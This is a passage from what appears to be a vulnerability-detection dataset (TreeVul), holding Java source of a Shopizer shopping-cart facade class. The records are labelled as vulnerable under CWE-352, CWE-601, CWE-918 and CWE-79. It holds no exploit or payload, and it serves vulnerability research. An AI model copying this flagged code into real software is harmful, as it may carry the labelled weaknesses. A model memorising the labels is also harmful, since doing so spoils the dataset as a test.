item.getCode(), store );\n    \t\t\t}\n    \t\t\t\n                com.salesmanager.core.model.shoppingcart.ShoppingCartItem entryToUpdate =\n                        getEntryToUpdate( item.getId(), cartModel );\n\n                if ( entryToUpdate == null ) {\n                        throw new CartModificationException( \"Unknown entry number.\" );\n                }\n\n                entryToUpdate.getProduct();\n\n                LOG.info( \"Updating cart entry quantity to\" + item.getQuantity() );\n                entryToUpdate.setQuantity( (int) item.getQuantity() );\n                \n                List<ProductAttribute> productAttributes = new ArrayList<ProductAttribute>();\n                productAttributes.addAll( entryToUpdate.getProduct().getAttributes() );\n                \n                final FinalPrice finalPrice =\n                        productPriceUtils.getFinalProductPrice( entryToUpdate.getProduct(), productAttributes );\n                entryToUpdate.setItemPrice( finalPrice.getFinalPrice() );\n                    \n\n                cartItems.add(entryToUpdate);\n    \t\t\t\n    \t\t\t\n    \t\t\t\n    \t\t\t\n    \t\t}\n    \t\t\n    \t\tcartModel.setLineItems(cartItems);\n    \t\tshoppingCartService.saveOrUpdate( cartModel );\n\n    \t\t\n            LOG.info( \"Cart entry updated with desired quantity\" );\n            ShoppingCartDataPopulator shoppingCartDataPopulator = new ShoppingCartDataPopulator();\n            shoppingCartDataPopulator.setShoppingCartCalculationService( shoppingCartCalculationService );\n            shoppingCartDataPopulator.setPricingService( pricingService );\n            shoppingCartDataPopulator.setimageUtils(imageUtils);\n            return shoppingCartDataPopulator.populate( cartModel, store, language );\n\n        }\n\n\n    private ShoppingCart getCartModel( final String cartId,final MerchantStore store )\n    {\n        if ( StringUtils.isNotBlank( cartId ) )\n        {\n           try\n            {\n                return shoppingCartService.getByCode( cartId, store );\n            }\n            catch ( ServiceException e )\n            {\n                LOG.error( \"unable to find any cart asscoiated with this Id: \" + cartId );\n                LOG.error( \"error while fetching cart model...\", e );\n                return null;\n            }\n            catch( NoResultException nre) {\n           \t//nothing\n            }\n\n        }\n        return null;\n    }\n\n\t@Override\n\tpublic ShoppingCartData getShoppingCartData(String code, MerchantStore store, Language language) {\n\t\ttry {\n\t\t\tShoppingCart cartModel = shoppingCartService.getByCode( code, store );\n\t\t\tif(cartModel!=null) {\n\t\t\t\tShoppingCartData cart = getShoppingCartData(cartModel, language);\n\t\t\t\treturn cart;\n\t\t\t}\n\t\t} catch( NoResultException nre) {\n\t        \t//nothing\n\n\t\t} catch(Exception e) {\n\t\t\tLOG.error(\"Cannot retrieve cart code \" + code,e);\n\t\t}\n\n\n\t\treturn null;\n\t}\n\n\t@Override\n\tpublic ShoppingCart getShoppingCartModel(String shoppingCartCode,\n\t\t\tMerchantStore store) throws Exception {\n\t\treturn shoppingCartService.getByCode( shoppingCartCode, store );\n\t}\n\n\t@Override\n\tpublic ShoppingCart getShoppingCartModel(Customer customer,\n\t\t\tMerchantStore store) throws Exception {\n\t\treturn shoppingCartService.getByCustomer(customer);\n\t}\n\n\t@Override\n\tpublic void saveOrUpdateShoppingCart(ShoppingCart cart) throws Exception {\n\t\tshoppingCartService.saveOrUpdate(cart);\n\t\t\n\t}\n\n\t@Override\n\tpublic ReadableShoppingCart getCart(Customer customer, MerchantStore store, Language language) throws Exception {\n\t\t\n\t\tValidate.notNull(customer,\"Customer cannot be null\");\n\t\tValidate.notNull(customer.getId(),\"Customer.id cannot be null or empty\");\n\t\t\n\t\t//Check if customer has an existing shopping cart\n\t\tShoppingCart cartModel = shoppingCartService.getByCustomer(customer);\n\t\t\n\t\tif(cartModel == null) {\n\t\t\treturn null;\n\t\t}\n\t\t\n        shoppingCartCalculationService.calculate( cartModel, store, language );\n        \n        ReadableShoppingCartPopulator readableShoppingCart = new ReadableShoppingCartPopulator();\n        \n        readableShoppingCart.setImageUtils(imageUtils);\n        readableShoppingCart.setPricingService(pricingService);\n        readableShoppingCart.setProductAttributeService(productAttributeService);\n        readableShoppingCart.setShoppingCartCalculationService(shoppingCartCalculationService);\n  \n        ReadableShoppingCart readableCart = new  ReadableShoppingCart();\n        \n        readableShoppingCart.populate(cartModel, readableCart,  store, language);\n\n\t\t\n\t\treturn readableCart;\n\t}\n\t\n\t@Override\n\tpublic ReadableShoppingCart addToCart(PersistableShoppingCartItem item, MerchantStore store,\n\t\t\tLanguage language) throws Exception {\n\t\t\n\t\tValidate.notNull(item,\"PersistableShoppingCartItem cannot be null\");\n\t\t\n\t\t//if cart does not exist create a new one\n\n\t\tShoppingCart cartModel = new ShoppingCart();\n\t\tcartModel.setMerchantStore(store);\n\t\tcartModel.setShoppingCartCode(uniqueShoppingCartCode());\n\n\n\t\treturn readableShoppingCart(cartModel,item,store,language);\n\t}\n\t\n\n\t@SuppressWarnings(\"unchecked\")\n\t@Override\n\tpublic void removeShoppingCartItem(String cartCode, Long productId,\n\t      MerchantStore merchant, Language language) throws Exception {\n\t    Validate.notNull(cartCode, \"Shopping cart code must not be null\");\n\t    Validate.notNull(productId, \"product id must not be null\");\n\t    Validate.notNull(merchant, \"MerchantStore must not be null\");\n\t    \n\t  \n\t    //get cart\n\t    ShoppingCart cart = getCartModel(cartCode, merchant);\n\t    \n\t    if(cart == null) {\n\t      throw new ResourceNotFoundException(\"Cart code [ \" + cartCode + \" ] not found\");\n\t    }\n\t    \n\t    Set<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> items = new HashSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem>();\n\t    com.salesmanager.core.model.shoppingcart.ShoppingCartItem itemToDelete = null;\n\t    for ( com.salesmanager.core.model.shoppingcart.ShoppingCartItem shoppingCartItem : cart.getLineItems() )\n        {\n            if ( shoppingCartItem.getProduct().getId().longValue() == productId.longValue() )\n            {\n                //get cart item\n                itemToDelete =\n                    getEntryToUpdate( shoppingCartItem.getId(), cart );\n                \n                \n                //break;\n\n            } else {\n              items.add(shoppingCartItem);\n            }\n        }\n\t    //delete item\n\t    if(itemToDelete!=null) {\n\t      shoppingCartService.deleteShoppingCartItem(itemToDelete.getId());\n\t    }\n        \n        //remaining items\n\t    if(items.size()>0) {\n\t    \tcart.setLineItems(items);\n\t    } else {\n\t    \tcart.getLineItems().clear();\n\t    }\n\n        //if(items.size()>0) {\n          shoppingCartService.saveOrUpdate(cart);//update cart with remaining items\n          //ReadableShoppingCart readableShoppingCart = this.getByCode(cartCode, merchant, language);\n        //}\n\n\t}\n\t\n\tprivate ReadableShoppingCart readableShoppingCart(ShoppingCart cartModel, PersistableShoppingCartItem item, MerchantStore store,\n\t\t\tLanguage language) throws Exception {\n\t\t\n\t\t\n\t\tcom.salesmanager.core.model.shoppingcart.ShoppingCartItem itemModel = createCartItem(cartModel, item, store);\n\t\t\n\t\t//need to check if the item is already in the cart\n        boolean duplicateFound = false;\n        //only if item has no attributes\n        if(CollectionUtils.isEmpty(item.getAttributes())) {//increment quantity\n        \t//get duplicate item from the cart\n        \tSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> cartModelItems = cartModel.getLineItems();\n        \tfor(com.salesmanager.core.model.shoppingcart.ShoppingCartItem cartItem : cartModelItems) {\n        \t\tif(cartItem.getProduct().getId().longValue()==item.getProduct().longValue()) {\n        \t\t\tif(CollectionUtils.isEmpty(cartItem.getAttributes())) {\n        \t\t\t\tif(!duplicateFound) {\n        \t\t\t\t\tif(!itemModel.isProductVirtual()) {\n\t        \t\t\t\t\tcartItem.setQuantity(cartItem.getQuantity() + item.getQuantity());\n        \t\t\t\t\t}\n        \t\t\t\t\tduplicateFound = true;\n        \t\t\t\t\tbreak;\n        \t\t\t\t}\n        \t\t\t}\n        \t\t}\n        \t}\n        } \n        \n        if(!duplicateFound) {\n        \tcartModel.getLineItems().add( itemModel );\n        }\n        \n        saveShoppingCart( cartModel );\n\n        //refresh cart\n        cartModel = shoppingCartService.getById(cartModel.getId(), store);\n\n        shoppingCartCalculationService.calculate( cartModel, store, language );\n        \n        ReadableShoppingCartPopulator readableShoppingCart = new ReadableShoppingCartPopulator();\n        \n        readableShoppingCart.setImageUtils(imageUtils);\n        readableShoppingCart.setPricingService(pricingService);\n        readableShoppingCart.setProductAttributeService(productAttributeService);\n        readableShoppingCart.setShoppingCartCalculationService(shoppingCartCalculationService);\n  \n        ReadableShoppingCart readableCart = new  ReadableShoppingCart();\n        \n        readableShoppingCart.populate(cartModel, readableCart,  store, language);\n\n\t\t\n\t\treturn readableCart;\n\t\t\n\t}\n\n\n\tprivate ReadableShoppingCart modifyCart(ShoppingCart cartModel, PersistableShoppingCartItem item, MerchantStore store,\n\t\t\tLanguage language) throws Exception {\n\t\t\n\t\t\n\t\tcom.salesmanager.core.model.shoppingcart.ShoppingCartItem itemModel = createCartItem(cartModel, item, store);\n\n        boolean itemModified = false;\n        //check if existing product\n       \tSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> items = cartModel.getLineItems();\n       \t//com.salesmanager.core.model.shoppingcart.ShoppingCartItem affectedItem = null;\n       \tif(!CollectionUtils.isEmpty(items)) {\n       \t\tSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> newItems = new HashSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem>();\n       \t\tSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> removeItems = new HashSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem>();\n\t    \tfor(com.salesmanager.core.model.shoppingcart.ShoppingCartItem anItem : items) {//take care of existing product\n\t    \t\tif(itemModel.getProduct().getId().longValue() == anItem.getProduct().getId()) {\n\t    \t\t\tif(item.getQuantity()==0) {//left aside item to be removed\n\t    \t\t\t\t//don't add it to new list of item\n\t    \t\t\t\tremoveItems.add(anItem);\n\t    \t\t\t} else {\n\t    \t\t\t\t//new quantity\n\t    \t\t\t\tanItem.setQuantity(item.getQuantity());\n\t    \t\t\t\tnewItems.add(anItem);\n\t    \t\t\t}\n\t    \t\t\titemModified = true;\n\t    \t\t} else {\n\t    \t\t\tnewItems.add(anItem);\n\t    \t\t}\n\t    \t}\n\t    \t\n\t    \tif(!removeItems.isEmpty()) {\n\t    \t\tfor(com.salesmanager.core.model.shoppingcart.ShoppingCartItem emptyItem : removeItems) {\n\t    \t\t\tshoppingCartService.deleteShoppingCartItem(emptyItem.getId());\n\t    \t\t}\n\t    \t\t\n\t    \t}\n\t    \t\n\t    \tif(!itemModified) {\n\t    \t  newItems.add(itemModel);\n\t    \t}\n\t    \t\n\t    \tif(newItems.isEmpty()) {\n\t    \t\tnewItems = null;\n\t    \t}\n\t    \t\n\t    \tcartModel.setLineItems(newItems);\n       \t} else {\n           \t//new item\n             if(item.getQuantity() > 0) {\n                cartModel.getLineItems().add( itemModel );\n             }\n       \t}\n\n       \t//if cart items are null just return cart with no items\n\n        saveShoppingCart( cartModel );\n\n        //refresh cart\n        cartModel = shoppingCartService.getById(cartModel.getId(), store);\n        \n        if(cartModel==null) {\n        \treturn null;\n        }\n\n        shoppingCartCalculationService.calculate( cartModel, store, language );\n        \n        ReadableShoppingCartPopulator readableShoppingCart = new ReadableShoppingCartPopulator();\n        \n        readableShoppingCart.setImageUtils(imageUtils);\n        readableShoppingCart.setPricingService(pricingService);\n        readableShoppingCart.setProductAttributeService(productAttributeService);\n        readableShoppingCart.setShoppingCartCalculationService(shoppingCartCalculationService);\n  \n        ReadableShoppingCart readableCart = new  ReadableShoppingCart();\n        \n        readableShoppingCart.populate(cartModel, readableCart,  store, language);\n\n\t\t\n\t\treturn readableCart;\n\t\t\n\t}\n\n\t@Override\n\tpublic ReadableShoppingCart addToCart(Customer customer, PersistableShoppingCartItem item, MerchantStore store,\n\t\t\tLanguage language) throws Exception {\n\t\t\n\t\tValidate.notNull(customer,\"Customer cannot be null\");\n\t\tValidate.notNull(customer.getId(),\"Customer.id cannot be null or empty\");\n\t\t\n\t\t//Check if customer has an existing shopping cart\n\t\tShoppingCart cartModel = shoppingCartService.getByCustomer(customer);\n\t\t\n\t\t//if cart does not exist create a new one\n\t\tif(cartModel==null) {\n\t\t\tcartModel = new ShoppingCart();\n\t\t\tcartModel.setCustomerId(customer.getId());\n\t\t\tcartModel.setMerchantStore(store);\n\t\t\tcartModel.setShoppingCartCode(uniqueShoppingCartCode());\n\t\t}\n\t\t\n\t\treturn readableShoppingCart(cartModel,item,store,language);\n\t}\n\t\n\t@Override\n\tpublic ReadableShoppingCart modifyCart(String cartCode, PersistableShoppingCartItem item, MerchantStore store,\n\t\t\tLanguage language) throws Exception {\n\n\t\tValidate.notNull(cartCode,\"PString cart code cannot be null\");\n\t\tValidate.notNull(item,\"PersistableShoppingCartItem cannot be null\");\n\t\t\n\t\tShoppingCart cartModel = this.getCartModel(cartCode, store);\n\n\n\t\treturn modifyCart(cartModel,item, store, language);\n\t\t\n\t\t\n\t}\n\t\n\tprivate void saveShoppingCart(ShoppingCart shoppingCart) throws Exception {\n\t\tshoppingCartService.save(shoppingCart);\n\t}\n\t\n\tprivate String uniqueShoppingCartCode() {\n\t\treturn UUID.randomUUID().toString().replaceAll( \"-\", \"\" );\n\t}\n\n\t@Override\n\tpublic ReadableShoppingCart getById(Long shoppingCartId, MerchantStore store, Language language) throws Exception {\n\n\t\tShoppingCart cart = shoppingCartService.getById(shoppingCartId);\n\t\t\n\t\tReadableShoppingCart readableCart = null;\n\t\t\n\t\tif(cart != null) {\n\t\t\t\n\t        ReadableShoppingCartPopulator readableShoppingCart = new ReadableShoppingCartPopulator();\n\t        \n\t        readableShoppingCart.setImageUtils(imageUtils);\n\t        readableShoppingCart.setPricingService(pricingService);\n\t        readableShoppingCart.setProductAttributeService(productAttributeService);\n\t        readableShoppingCart.setShoppingCartCalculationService(shoppingCartCalculationService);\n\n\t        readableShoppingCart.populate(cart, readableCart,  store, language);\n\t\t\t\n\t\t\t\n\t\t}\n\t\t\n\t\treturn readableCart;\n\t}\n\n\t@Override\n\tpublic ShoppingCart getShoppingCartModel(Long id, MerchantStore store) throws Exception {\n\t\treturn shoppingCartService.getById(id);\n\t}\n\n\t@Override\n\tpublic ReadableShoppingCart getByCode(String code, MerchantStore store, Language language) throws Exception {\n\t\t\n\t\tShoppingCart cart = shoppingCartService.getByCode(code, store);\n\t\t\n\t\tReadableShoppingCart readableCart = null;\n\t\t\n\t\tif(cart != null) {\n\t\t\t\n\t        ReadableShoppingCartPopulator readableShoppingCart = new ReadableShoppingCartPopulator();\n\t        \n\t        readableShoppingCart.setImageUtils(imageUtils);\n\t        readableShoppingCart.setPricingService(pricingService);\n\t        readableShoppingCart.setProductAttributeService(productAttributeService);\n\t        readableShoppingCart.setShoppingCartCalculationService(shoppingCartCalculationService);\n\n\t        readableCart = readableShoppingCart.populate(cart, null,  store, language);\n\t\t\t\n\t\t\t\n\t\t}\n\t\t\n\t\treturn readableCart;\n\t\t\n\t}\n\n\n\n}\n",
    "target": 1,
    "language": "java",
    "dataset": "TreeVul",
    "idx": 700164,
    "RELATED_CWE": [
      "CWE-352",
      "CWE-601",
      "CWE-918"
    ]
  },
  {
    "CWE_ID": [
      "CWE-79"
    ],
    "code": "/**\n *\n */\npackage com.salesmanager.shop.store.controller.shoppingCart.facade;\n\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.HashSet;\nimport java.util.List;\nimport java.util.Set;\nimport java.util.UUID;\n\nimport javax.inject.Inject;\nimport javax.persistence.NoResultException;\n\nimport org.apache.commons.collections4.CollectionUtils;\nimport org.apache.commons.lang3.StringUtils;\nimport org.apache.commons.lang3.Validate;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Qualifier;\nimport org.springframework.stereotype.Service;\nimport org.springframework.web.context.request.RequestContextHolder;\nimport org.springframework.web.context.request.ServletRequestAttributes;\n\nimport com.salesmanager.core.business.exception.ServiceException;\nimport com.salesmanager.core.business.services.catalog.product.PricingService;\nimport com.salesmanager.core.business.services.catalog.product.ProductService;\nimport com.salesmanager.core.business.services.catalog.product.attribute.ProductAttributeService;\nimport com.salesmanager.core.business.services.shoppingcart.ShoppingCartCalculationService;\nimport com.salesmanager.core.business.services.shoppingcart.ShoppingCartService;\nimport com.salesmanager.core.business.utils.ProductPriceUtils;\nimport com.salesmanager.core.model.catalog.product.Product;\nimport com.salesmanager.core.model.catalog.product.attribute.ProductAttribute;\nimport com.salesmanager.core.model.catalog.product.availability.ProductAvailability;\nimport com.salesmanager.core.model.catalog.product.price.FinalPrice;\nimport com.salesmanager.core.model.customer.Customer;\nimport com.salesmanager.core.model.merchant.MerchantStore;\nimport com.salesmanager.core.model.reference.language.Language;\nimport com.salesmanager.core.model.shoppingcart.ShoppingCart;\nimport com.salesmanager.shop.constants.Constants;\nimport com.salesmanager.shop.model.shoppingcart.CartModificationException;\nimport com.salesmanager.shop.model.shoppingcart.PersistableShoppingCartItem;\nimport com.salesmanager.shop.model.shoppingcart.ReadableShoppingCart;\nimport com.salesmanager.shop.model.shoppingcart.ShoppingCartAttribute;\nimport com.salesmanager.shop.model.shoppingcart.ShoppingCartData;\nimport com.salesmanager.shop.model.shoppingcart.ShoppingCartItem;\nimport com.salesmanager.shop.populator.shoppingCart.ReadableShoppingCartPopulator;\nimport com.salesmanager.shop.populator.shoppingCart.ShoppingCartDataPopulator;\nimport com.salesmanager.shop.store.api.exception.ResourceNotFoundException;\nimport com.salesmanager.shop.utils.DateUtil;\nimport com.salesmanager.shop.utils.ImageFilePath;\n\n/**\n * @author Umesh Awasthi\n * @version 1.0\n * @since 1.0\n */\n@Service( value = \"shoppingCartFacade\" )\npublic class ShoppingCartFacadeImpl\n    implements ShoppingCartFacade\n{\n\n    \n    private static final Logger LOG = LoggerFactory.getLogger(ShoppingCartFacadeImpl.class);\n\n    @Inject\n    private ShoppingCartService shoppingCartService;\n\n    @Inject\n    ShoppingCartCalculationService shoppingCartCalculationService;\n\n    @Inject\n    private ProductPriceUtils productPriceUtils;\n\n    @Inject\n    private ProductService productService;\n\n    @Inject\n    private PricingService pricingService;\n\n    @Inject\n    private ProductAttributeService productAttributeService;\n\n\t@Inject\n\t@Qualifier(\"img\")\n\tprivate ImageFilePath imageUtils;\n\n    public void deleteShoppingCart(final Long id, final MerchantStore store) throws Exception {\n    \tShoppingCart cart = shoppingCartService.getById(id, store);\n    \tif(cart!=null) {\n    \t\tshoppingCartService.deleteCart(cart);\n    \t}\n    }\n    \n    @Override\n    public void deleteShoppingCart(final String code, final MerchantStore store) throws Exception {\n    \tShoppingCart cart = shoppingCartService.getByCode(code, store);\n    \tif(cart!=null) {\n    \t\tshoppingCartService.deleteCart(cart);\n    \t}\n    }\n\n    @Override\n    public ShoppingCartData addItemsToShoppingCart( final ShoppingCartData shoppingCartData,\n                                                    final ShoppingCartItem item, final MerchantStore store, final Language language,final Customer customer )\n        throws Exception\n    {\n\n        ShoppingCart cartModel = null;\n        if(item.getQuantity() < 1) item.setQuantity(1);\n        /**\n         * Sometimes a user logs in and a shopping cart is present in db (shoppingCartData\n         * but ui has no cookie with shopping cart code so the cart code will have\n         * to be added to the item in order to process add to cart normally\n         */\n        if(shoppingCartData != null && StringUtils.isBlank(item.getCode())) {\n        \titem.setCode(shoppingCartData.getCode());\n        }\n        \n        \n        if ( !StringUtils.isBlank( item.getCode() ) )\n        {\n            // get it from the db\n            cartModel = getShoppingCartModel( item.getCode(), store );\n            if ( cartModel == null )\n            {\n                cartModel = createCartModel( shoppingCartData.getCode(), store,customer );\n            }\n\n        }\n\n        if ( cartModel == null )\n        {\n\n            final String shoppingCartCode =\n                StringUtils.isNotBlank( shoppingCartData.getCode() ) ? shoppingCartData.getCode() : null;\n            cartModel = createCartModel( shoppingCartCode, store,customer );\n\n        }\n        com.salesmanager.core.model.shoppingcart.ShoppingCartItem shoppingCartItem =\n            createCartItem( cartModel, item, store );\n        \n        \n        boolean duplicateFound = false;\n        if(CollectionUtils.isEmpty(item.getShoppingCartAttributes())) {//increment quantity\n        \t//get duplicate item from the cart\n        \tSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> cartModelItems = cartModel.getLineItems();\n        \tfor(com.salesmanager.core.model.shoppingcart.ShoppingCartItem cartItem : cartModelItems) {\n        \t\tif(cartItem.getProduct().getId().longValue()==shoppingCartItem.getProduct().getId().longValue()) {\n        \t\t\tif(CollectionUtils.isEmpty(cartItem.getAttributes())) {\n        \t\t\t\tif(!duplicateFound) {\n        \t\t\t\t\tif(!shoppingCartItem.isProductVirtual()) {\n\t        \t\t\t\t\tcartItem.setQuantity(cartItem.getQuantity() + shoppingCartItem.getQuantity());\n        \t\t\t\t\t}\n        \t\t\t\t\tduplicateFound = true;\n        \t\t\t\t\tbreak;\n        \t\t\t\t}\n        \t\t\t}\n        \t\t}\n        \t}\n        }\n        \n        if(!duplicateFound) {\n        \t//shoppingCartItem.getAttributes().stream().forEach(a -> {a.setProductAttributeId(productAttributeId);});\n        \tcartModel.getLineItems().add( shoppingCartItem );\n        }\n        \n        /** Update cart in database with line items **/\n        shoppingCartService.saveOrUpdate( cartModel );\n\n        //refresh cart\n        cartModel = shoppingCartService.getById(cartModel.getId(), store);\n\n        shoppingCartCalculationService.calculate( cartModel, store, language );\n\n        ShoppingCartDataPopulator shoppingCartDataPopulator = new ShoppingCartDataPopulator();\n        shoppingCartDataPopulator.setShoppingCartCalculationService( shoppingCartCalculationService );\n        shoppingCartDataPopulator.setPricingService( pricingService );\n        shoppingCartDataPopulator.setimageUtils(imageUtils);\n\n\n        return shoppingCartDataPopulator.populate( cartModel, store, language );\n    }\n\n    private com.salesmanager.core.model.shoppingcart.ShoppingCartItem createCartItem( final ShoppingCart cartModel,\n                                                                                               final ShoppingCartItem shoppingCartItem,\n                                                                                               final MerchantStore store )\n        throws Exception\n    {\n\n        Product product = productService.getById( shoppingCartItem.getProductId() );\n\n        if ( product == null )\n        {\n            throw new Exception( \"Item with id \" + shoppingCartItem.getProductId() + \" does not exist\" );\n        }\n\n        if ( product.getMerchantStore().getId().intValue() != store.getId().intValue() )\n        {\n            throw new Exception( \"Item with id \" + shoppingCartItem.getProductId() + \" does not belong to merchant \"\n                + store.getId() );\n        }\n        \n\t\t/**\n\t\t * Check if product quantity is 0\n\t\t * Check if product is available\n\t\t * Check if date available <= now\n\t\t */\n        \n        Set<ProductAvailability> availabilities = product.getAvailabilities();\n        if(availabilities == null) {\n        \t\n        \tthrow new Exception( \"Item with id \" + product.getId() + \" is not properly configured\" );\n        \t\n        }\n        \t\n        for(ProductAvailability availability : availabilities) {\n        \tif(availability.getProductQuantity() == null || availability.getProductQuantity().intValue() <= 0) {\n                throw new Exception( \"Item with id \" + product.getId() + \" is not available\");\n        \t}\n        }\n        \n        if(!product.isAvailable()) {\n        \tthrow new Exception( \"Item with id \" + product.getId() + \" is not available\");\n        }\n        \n        if(!DateUtil.dateBeforeEqualsDate(product.getDateAvailable(), new Date())) {\n        \tthrow new Exception( \"Item with id \" + product.getId() + \" is not available\");\n        }\n\n\n        com.salesmanager.core.model.shoppingcart.ShoppingCartItem item =\n            shoppingCartService.populateShoppingCartItem( product );\n\n        item.setQuantity( shoppingCartItem.getQuantity() );\n        item.setShoppingCart( cartModel );\n\n        // attributes\n        List<ShoppingCartAttribute> cartAttributes = shoppingCartItem.getShoppingCartAttributes();\n        if ( !CollectionUtils.isEmpty( cartAttributes ) )\n        {\n            for ( ShoppingCartAttribute attribute : cartAttributes )\n            {\n                ProductAttribute productAttribute = productAttributeService.getById( attribute.getAttributeId() );\n                if ( productAttribute != null\n                    && productAttribute.getProduct().getId().longValue() == product.getId().longValue() )\n                {\n                    com.salesmanager.core.model.shoppingcart.ShoppingCartAttributeItem attributeItem =\n                        new com.salesmanager.core.model.shoppingcart.ShoppingCartAttributeItem( item,\n                                                                                                         productAttribute );\n\n                    item.addAttributes( attributeItem );\n                }\n            }\n        }\n        return item;\n\n    }\n\n    \n    //used for api\n\tprivate com.salesmanager.core.model.shoppingcart.ShoppingCartItem createCartItem(ShoppingCart cartModel,\n\t\t\t PersistableShoppingCartItem shoppingCartItem, MerchantStore store) throws Exception {\n\n\t\tProduct product = productService.getById(shoppingCartItem.getProduct());\n\n\t\tif (product == null) {\n\t\t\tthrow new ResourceNotFoundException(\"Item with id \" + shoppingCartItem.getProduct() + \" does not exist\");\n\t\t}\n\n\t\tif (product.getMerchantStore().getId().intValue() != store.getId().intValue()) {\n\t\t\tthrow new ResourceNotFoundException(\"Item with id \" + shoppingCartItem.getProduct() + \" does not belong to merchant \"\n\t\t\t\t\t+ store.getId());\n\t\t}\n\t\t\n\t\t/**\n\t\t * Check if product quantity is 0\n\t\t * Check if product is available\n\t\t * Check if date available <= now\n\t\t */\n        \n        Set<ProductAvailability> availabilities = product.getAvailabilities();\n        if(availabilities == null) {\n        \t\n        \tthrow new Exception( \"Item with id \" + product.getId() + \" is not properly configured\" );\n        \t\n        }\n        \t\n        for(ProductAvailability availability : availabilities) {\n        \tif(availability.getProductQuantity() == null || availability.getProductQuantity().intValue() <= 0) {\n                throw new Exception( \"Item with id \" + product.getId() + \" is not available\");\n        \t}\n        }\n        \n        if(!product.isAvailable()) {\n        \tthrow new Exception( \"Item with id \" + product.getId() + \" is not available\");\n        }\n        \n        if(!DateUtil.dateBeforeEqualsDate(product.getDateAvailable(), new Date())) {\n        \tthrow new Exception( \"Item with id \" + product.getId() + \" is not available\");\n        }\n\t\t\n\n\t\tcom.salesmanager.core.model.shoppingcart.ShoppingCartItem item = shoppingCartService\n\t\t\t\t.populateShoppingCartItem(product);\n\n\t\titem.setQuantity(shoppingCartItem.getQuantity());\n\t\titem.setShoppingCart(cartModel);\n\t\t\n\t\t//set attributes\n\t\tList<com.salesmanager.shop.model.catalog.product.attribute.ProductAttribute> attributes = shoppingCartItem.getAttributes();\n\t\tif (!CollectionUtils.isEmpty(attributes)) {\n\t\t\tfor(com.salesmanager.shop.model.catalog.product.attribute.ProductAttribute attribute : attributes) {\n\t\t\t\t\n\t\t\t\tProductAttribute productAttribute = productAttributeService.getById(attribute.getId());\n\t\t\t\t\n\t\t\t\tif (productAttribute != null\n\t\t\t\t\t\t&& productAttribute.getProduct().getId().longValue() == product.getId().longValue()) {\n\t\t\t\t\t\n\t\t\t\t\tcom.salesmanager.core.model.shoppingcart.ShoppingCartAttributeItem attributeItem = new com.salesmanager.core.model.shoppingcart.ShoppingCartAttributeItem(\n\t\t\t\t\t\t\titem, productAttribute);\n\n\t\t\t\t\titem.addAttributes(attributeItem);\n\t\t\t\t}\t\t\t\t\n\t\t\t}\n\t\t}\n\n\t\treturn item;\n\n\t}   \n    \n\n    @Override\n    public ShoppingCart createCartModel( final String shoppingCartCode, final MerchantStore store,final Customer customer )\n        throws Exception\n    {\n        final Long CustomerId = customer != null ? customer.getId() : null;\n        ShoppingCart cartModel = new ShoppingCart();\n        if ( StringUtils.isNotBlank( shoppingCartCode ) )\n        {\n            cartModel.setShoppingCartCode( shoppingCartCode );\n        }\n        else\n        {\n            cartModel.setShoppingCartCode( uniqueShoppingCartCode() );\n        }\n\n        cartModel.setMerchantStore( store );\n        if ( CustomerId != null )\n        {\n            cartModel.setCustomerId( CustomerId );\n        }\n        shoppingCartService.create( cartModel );\n        return cartModel;\n    }\n\n\n\n\n\n    private com.salesmanager.core.model.shoppingcart.ShoppingCartItem getEntryToUpdate( final long entryId,\n                                                                                                 final ShoppingCart cartModel )\n    {\n        if ( CollectionUtils.isNotEmpty( cartModel.getLineItems() ) )\n        {\n            for ( com.salesmanager.core.model.shoppingcart.ShoppingCartItem shoppingCartItem : cartModel.getLineItems() )\n            {\n                if ( shoppingCartItem.getId().longValue() == entryId )\n                {\n                    LOG.info( \"Found line item  for given entry id: \" + entryId );\n                    return shoppingCartItem;\n\n                }\n            }\n        }\n        LOG.info( \"Unable to find any entry for given Id: \" + entryId );\n        return null;\n    }\n\n    private Object getKeyValue( final String key )\n    {\n        ServletRequestAttributes reqAttr = (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();\n        return reqAttr.getRequest().getAttribute( key );\n    }\n\n    @Override\n    public ShoppingCartData getShoppingCartData( final Customer customer, final MerchantStore store,\n                                                 final String shoppingCartId, Language language)\n        throws Exception\n    {\n\n        ShoppingCart cart = null;\n        try\n        {\n            if ( customer != null )\n            {\n                LOG.info( \"Reteriving customer shopping cart...\" );\n\n                cart = shoppingCartService.getShoppingCart( customer );\n\n            }\n\n            else\n            {\n                if ( StringUtils.isNotBlank( shoppingCartId ) && cart == null )\n                {\n                    cart = shoppingCartService.getByCode( shoppingCartId, store );\n                }\n\n            }\n        }\n        catch ( ServiceException ex )\n        {\n            LOG.error( \"Error while retriving cart from customer\", ex );\n        }\n        catch( NoResultException nre) {\n        \t//nothing\n        }\n\n        if ( cart == null )\n        {\n            return null;\n        }\n\n        LOG.info( \"Cart model found.\" );\n\n        ShoppingCartDataPopulator shoppingCartDataPopulator = new ShoppingCartDataPopulator();\n        shoppingCartDataPopulator.setShoppingCartCalculationService( shoppingCartCalculationService );\n        shoppingCartDataPopulator.setPricingService( pricingService );\n        shoppingCartDataPopulator.setimageUtils(imageUtils);\n\n        //Language language = (Language) getKeyValue( Constants.LANGUAGE );\n        MerchantStore merchantStore = (MerchantStore) getKeyValue( Constants.MERCHANT_STORE );\n        \n        ShoppingCartData shoppingCartData = shoppingCartDataPopulator.populate( cart, merchantStore, language );\n        \n/*        List<ShoppingCartItem> unavailables = new ArrayList<ShoppingCartItem>();\n        List<ShoppingCartItem> availables = new ArrayList<ShoppingCartItem>();\n        //Take out items no more available\n        List<ShoppingCartItem> items = shoppingCartData.getShoppingCartItems();\n        for(ShoppingCartItem item : items) {\n        \tString code = item.getProductCode();\n        \tProduct p =productService.getByCode(code, language);\n        \tif(!p.isAvailable()) {\n        \t\tunavailables.add(item);\n        \t} else {\n        \t\tavailables.add(item);\n        \t}\n        \t\n        }\n        shoppingCartData.setShoppingCartItems(availables);\n        